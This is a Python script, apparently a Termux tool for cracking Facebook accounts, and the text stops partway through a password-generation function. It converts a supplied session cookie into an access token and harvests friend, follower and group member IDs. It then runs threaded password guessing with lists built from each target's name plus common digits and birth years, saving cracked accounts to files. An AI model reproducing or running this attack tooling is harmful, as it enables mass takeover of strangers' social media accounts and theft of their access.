#@tiger_krd
import os, sys, subprocess, platform
try:
	import rich
except ImportError:
	os.system('pip install rich')
	
import rich
from rich.markdown import Markdown
from rich.console import Console

try:
	import requests
except ImportError:
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	os.system('pip install bs4')
try:
	import mechanize
except ImportError:
	os.system('pip install mechanize')
try:
	import stdiomask
except ImportError:
	os.system('pip install stdiomask')
	
bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	os.system('pkg install play-audio')
	
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI

acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="•"

ok, cp, id, user, pwx, loop = [], [], [], [], [], 0

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.0003)
		
def jalane(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
def chk(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "**".join(uuid) 
  print("\n\n\x1b[37;1m  YOUR ID : "+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/X-tiger-X/tiger/main/fuck.txt").text 
    if id in httpCaht: 
      print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[91m  ID ACTIVE NYA BO ACTIVE KRDNY ID NAMA BNERA BO @tiger_krd\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()

def folder():
	try:os.mkdir('IG')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass

dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "

author = 'TOMAS'
fb_me = 'NEED'
github = 'https://github.com/X-TIGER-X'

def banner():
	os.system('clear')
	logo = (f'# • Author : {author} •')
	play = rich.markdown.Markdown(logo, style='green')
	rich.console.Console().print(play)
	jalan (
f"""{M}
▄▄▄█████▓ ██▓  ▄████ ▓█████  ██▀███  
▓  ██▒ ▓▒▓██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░▒██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░ ░██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
  ▒██▒ ░ ░██░░▒▓███▀▒░▒████▒░██▓ ▒██▒
  ▒ ░░   ░▓   ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
    ░     ▒ ░  ░   ░  ░ ░  ░  ░▒ ░ ▒░
  ░       ▒ ░░ ░   ░    ░     ░░   ░ 
          ░        ░    ░  ░   ░              
""")
	jalan (f' {M}════════════════════════════════════════')
	jalan (' %s#%s IP   %s:%s %s %s- %s%s'%(M,M,M,M,IP,M,M,M))
	jalan (f' {M}# {M}Git  {M}: {M}{github}')
	jalan (f' {M}════════════════════════════════════════\n')
	
def romz_xyz(cookie,venom={}):
	for x in cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		if len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	return venom

def Masuk():
	try:
		kueh = romz_xyz(open("data/cookies","r").read().strip())
	except FileNotFoundError:
		os.system('clear')
		banner()
		jalan ('%s%s%s 01 %sChwna Zhwrawa ba (Cookie) '%(M,M,M,M))
		jalan ('%s%s%s 00 %sEXIT '%(M,M,M,M))
		while True:
			rom = input ("\n%s# %sHalbzhera %s> %s"%(M,M,M,M))
			if rom in(""):
				print("%s%s ERROR "%(M,til))
			elif rom in ('1','01'):
				jalane("\n%s!%s COOKIE FB DANE"%(M,M))
				kukis = input("%s# %sCookie %s> %s"%(M,M,M,M))
				if kukis in(""):
					print ("%s%s isi cookie kentod "%(M,til))
					exit()
				else:
					konverter(kukis)
					masuk(kukis).login()
			elif nanya in("n","N"):
					exit()
			elif rom in ('0', '00'):
				exit('\n')
			else:
				exit("%s%s COOKIE HALAEA [!] "%(M,til))
				
	pilihan().menu()
	
class masuk:
	
	def __init__(self,cok):
		self.cok = cok
		self.url = "https://mbasic.facebook.com"
		
	def login(self):
		try:
			cek = requests.get(f"{self.url}/profile.php?v=info", cookies=romz_xyz(self.cok)).text
			if "mbasic_logout_button" in cek:
				open("data/cookies","w").write(self.cok)
				if "S" in cek:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					(romz_xyz(self.cok),cek).myinfo()
					mikey.usernem()
					print ("\n%s SUCCESS "%(H));jeda(2)
					pilihan().menu()
				else:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					mikey.lang(romz_xyz(self.cok))
					informasi.info(romz_xyz(self.cok),cek).myinfo()
					print ("\n%s SUCCESS "%(H));jeda(2)
					pilihan().menu()
			elif 'checkpoint' in cek:
				exit ("%s× CHECKPOINT "%(M));jeda(2)
			else:
				exit ("%s× COOKIE GHALATA "%(M));jeda(2)
		except requests.exceptions.ConnectionError:
			exit ("%s%s NO INTERNETi "%(M,til));jeda(2)
			
def konverter(kukis): 
	_header = {
		'Host':'business.facebook.com',
		'cache-control':'max-age=0',
		'upgrade-insecure-requests':'1',
		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type' : 'text/html; charset=utf-8',
		'accept-encoding':'gzip, deflate',
		'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cookie': kukis
	}
	try:
		ling = requests.get("https://business.facebook.com/business_locations", headers=_header)
		cari = re.search('(EAAG\w+)', ling.text)
		romz = cari.group(1)
		if 'EAAG' in romz:
			open('data/token.txt', 'w').write(romz)
			print (f'\n{P}#{O} Token anda {M}> {K}{romz} ');jeda(2)
			login_bot(romz)
	except AttributeError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()
	except UnboundLocalError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()

def login_bot(romz):
	print ('Ketik ulang (python tiger.py)')
class Menu():
	
	def __init__(self,url):
		self.url = url
		
	def tentang(self):
		try:
			kueh = romz_xyz(open("data/cookies","r").read().strip())
		except IOError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python tiger.py')
		try:
			tentang = json.loads(open("data/my_info","r").read().strip())
		except FileNotFoundError:
			(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text)
			os.system('python tiger.py')
		try:
			a = requests.get(f"{self.url}/profile.php", cookies = kueh).text
		except requests.exceptions.ConnectionError:
			exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		if "mbasic_logout_button" not in a:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('clear')
			os.system('python tiger.py')
		else:
			banner()
			jalan ('%s•%s 01 %sCRACK BY PUBLIC FRIEND '%(M,M,M))
			jalan ('%s•%s RM %sREMOVE FB (COOKIE)'%(M,M,M))
			jalan ('%s•%s 00 %sExit'%(M,M,M))
		
class pilihan:
	
	def __init__(self):
		self.kueh = romz_xyz(open("data/cookies","r").read().strip())
		try:
			self.token = open("data/token.txt","r").read()
		except FileNotFoundError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			os.system('clear')
			print ("%s%s COOKIE GHALATA "%(M,til));jeda(2)
			os.system('python tiger.py')
		self.url = ("https://mbasic.facebook.com")
		self.id = []
				
	def menu(self):
		Menu(self.url).tentang()
		slut = input('\n%s# %sHalbzhera %s> %s'%(M,M,M,M))
		if slut in['',' ']:
			print ('\n%s%s HALAEA'%(M,til));jeda(2)
			self.menu()
		elif slut in['1','01']:
			jalane ("\n%s%s %sID DANE LERA "%(U,til,O))
			idt = input('%s%s %sID/LERA DANE%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				jalane ('\n%s%s ERROR'%(M,til));jeda(2)
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
				try:
					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:
					user = idt
				try:
					print ('')
					token = self.token
					self.PublikGRAPH(user, token)
				except KeyError:
					exit('\n%s%s ID GHALATA '%(M,til))
		elif slut in['2','02']:
			try:
				token = self.token
				self.MassalGRAPH(token)
			except KeyError:
				exit('\n%s%s ID GHALATA '%(M,til))
		elif slut in['3','03']:
			jalane ("\n%s%s %sID LERA DANE "%(U,til,O))
			idt = input('%s%s %sID/LERA DANE%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				jalane ('\n%s%s Ghalata begora'%(M,til));jeda(2)
			else:
				data_ = (f"{self.url}/{idt}?v=followers")
			try:
				response = requests.get(data_, cookies=self.kueh).text
				if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				elif "Halaman yang Anda minta tidak ditemukan." in response:
					exit('\n%s%s ID ERROR '%(M,til))
				elif "Konten Tidak Ditemukan" in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				else:
					#print (f"{M}{til}{O} Nama akun {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0])
					print ('')
					self.FollowersPAR(data_)
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif slut in["4","04"]:
			while True:
				jalane ("\n%s%s %sPastikan group bersifat publik tidak private "%(U,til,O))
				idt = input('%s%s %sId group %s> %s'%(U,til,O,M,K))
				if idt in[""," "]:
					jalane ('\n%s%s isi yang benar'%(M,til));jeda(2)
				else:
					try:
						response = requests.get(f"{self.url}/browse/group/members/?id={idt}",cookies=self.kueh).text
						if "Halaman Tidak Ditemukan" in response:
							exit('\n%s%s group tidak di temukan'%(M,til))
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
							exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
						elif "Konten Tidak Ditemukan" in response:
							exit('\n%s%s group tidak di temukan'%(M,til))
						else:
							print (f"{M}{til}{O} Nama group {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0][8:])
							print("")
							self.grup(f"{self.url}/browse/group/members/?id={idt}");break
					except requests.exceptions.ConnectionError:
						exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif slut in['ua','UA']:
			useragent()
		elif slut in["5","05"]:
			jalane ("\n%s%s%s 01 %sCek hasil akun facebook "%(U,til,P,O))
			jalane ("%s%s%s 02 %sHapus hasil crack "%(U,til,P,O))
			jalane ("%s%s%s 00 %sKembali "%(M,M,M,M))
			rom = input('\n%s# %sPilih %s> %s'%(M,M,M,M))
			cek_cek(rom)
		elif slut in['6','06']:
			file_cp()
		elif slut in['RM','Rm','rm']:
			print ('\n%s%s menghapus data login dari termux '%(M,til));jeda(1)
			try:
				os.remove("data/cookies")
				os.remove("data/token.txt")
				os.remove("data/my_info")
			except:
				os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			jalan('\n%s✓ Remove done '%(H))
			exit()
		elif slut in['0','00']:
			print ('Yoo goodbyee...')
			exit
		
		if len(self.id)!=0:
			print
			return Crack().romiy(self.id)
		
	def MassalGRAPH(self, token):
		try:
			jum = int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			jalane ("\n%s%s %sPastikan daftar teman bersifat publik "%(U,til,O))
		except:jum=1
		for t in range(jum):
			t +=1
			idt = input('%s%s %sUsername/Id %s%s%s > %s'%(U,til,O,P,t,M,K))
			if idt in['']:
				print
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
				try:
					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:
					user = idt
		
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
		try:
			print ('')
			jalane(f"\r{M}{til}{O} HAMW IDYAKAN {M}> {M}[{H}{len(self.id)}{M}] ",end="")
		except:
			pass
						
	def PublikGRAPH(self, user, token):
		try:
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
				print(f"\r{M}{til}{O} HAMW IDYAKAN {M}> {M}[{H}{len(self.id)}{M}] ",end="")
		except:
			pass
			
	def FollowersPAR(self, data_):
		try:
			respon = requests.get(data_, cookies = self.kueh).text
			otw = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', respon) 
			for i in otw:
				if "&amp;refid=" in i[0]:
					self.id.append(re.findall("id=(.*?)&",i[0])[0]+"<=>"+i[1])
				elif "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				elif "?refid=" in i[0]:
					self.id.append(re.findall("(.*?)\?refid=",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{M}{til}{O} HAMW IDYAKAN {M}> {M}[{H}{len(self.id)}{M}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.FollowersPAR(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
			
	def grup(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',respon)
			for i in otw:
				if "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{M}{til}{O} HAMW IDYAKAN {M}> {M}[{H}{len(self.id)}{M}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.grup(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def tambah(gc):
					a = requests.get(gc, cookies=kueh).text
					b = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							print(f"\r{M}{til}{O} HAMW IDYAKAN {M}> {M}[{H}{len(self.id)}{M}] ",end="")
					if "Lihat Postingan Lainnya" in a:
						tambah(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				tambah(f"{self.url}/groups/"+re.search("id=(\\d*)",data_).group(1))
		except:
			pass
	
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
       "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
	
def useragent():
	print ("\n%s%s%s 01 %sGanti user agent "%(U,til,P,O))
	print ("%s%s%s 02 %sCek user agent "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(M,M,M,M))
	_romz_ = input('\n%s#%s Pilih%s >%s '%(M,M,M,M))
	uas(_romz_)
	
def uas(_romz_):
	if _romz_ == '':
		print ('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)
	elif _romz_ in("1","01"):
		print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
		print ("%s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
		ua = input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
		if ua in(""):
			print ("%s%s isi yang benar "%(M,til));jeda(2)
			menu()
		elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
			jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
			os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2)
			useragent(_romz_)
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2)
			menu()
		open("ua.txt","w").write(ua);jeda(2)
		print ("\n%s%s berhasil mengganti user agent"%(H,til));jeda(2)
		input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
		os.system('python tiger.py')
	elif _romz_ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();jeda(2)
			print ("%s%s%s user agent anda%s : %s%s"%(U,til,O,M,H,ua_));jeda(2)
			input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
			os.system('python tiger.py')
		except IOError:
			ua_ = '%s-'%(M)
	elif _romz_ in("0","00"):
		menu()
	else:
		print ('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)
		
pwx = []
class Crack:
	
	def __init__(self):
		self.id = []
		self.url = "https://mbasic.facebook.com"
		
	def romiy(self, id):
		self.id = id
		unikers = input('\n%s%s%s xot password da Aney? y/t%s > %s'%(U,til,O,M,K))
		if unikers in ('Y', 'y'):
			print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
			while True:
				pwx = input('%s%s%s password %s> %s'%(U,til,O,M,K))
				if pwx == '':
					print ('\n%s%s jangan kosong '%(M,til))
				elif len(pwx)<=5:
					print ('\n%s%s password minimal 6 karakter'%(M,til))
					exit()
				else:
					def manual(brute=None):
						ind = input('\n%s#%s HALBZHERA %s>%s '%(M,M,M,M))
						if ind =='':
							print("%s%s isi yang benar kentod "%(M,til))
							manual()
						elif ind in ('1', '01'):
							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.touch, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('2', '02'):
							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.basic, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('3', '03'):
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.mobil, _heck_, brute)
									except: pass
							hasil(ok,cp)
						else:
							print ('\n%s%s isi yang benar kentod'%(M,til))
							manual()
					print ('\n%s•%s [ %sBA CH JOREK CRACK AKAYT? %s ]\n'%(M,M,M,M))
					print ('%s• %s01%s Methode %sFree %s(Fast - Not recommended)'%(M,M,M,M,M))
					print ('%s• %s02%s Methode %sMbasic %s(Normal - Recommended) '%(M,M,M,M,M))
					print ('%s• %s03%s Methode %sMobile %s(Slow - Optional) '%(M,M,M,M,M))
					manual(pwx.split(','))
					break		
		elif unikers in ('T', 't'):
			print ('\n%s•%s [ %sBA CH JOREK CRACK AKAYT?%s ]\n'%(M,M,M,M))
			print ('%s• %s01%s REGAY %sFAST %s(VERY-FAST)'%(M,M,M,M,M))
			print ('%s• %s02%s REGAY %sNORMAL %s(NORMAL) '%(M,M,M,M,M))
			print ('%s• %s03%s REGAY %sXAW %s(SLOW) '%(M,M,M,M,M))
			self.langsung()
		else:
			print("%s%s Isi yang benar kentod "%(M,til));jeda(2)
			pilihan().menu()
	
	def langsung(self):
		global pwx
		suuu = input('\n%s#%s HALBZHERA %s>%s '%(M,M,M,M))
		if suuu == '':
			print("%s%s Isi yang benar kentod "%(M,til))
			self.langsung()
		elif suuu in ('1', '01'):
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 3:
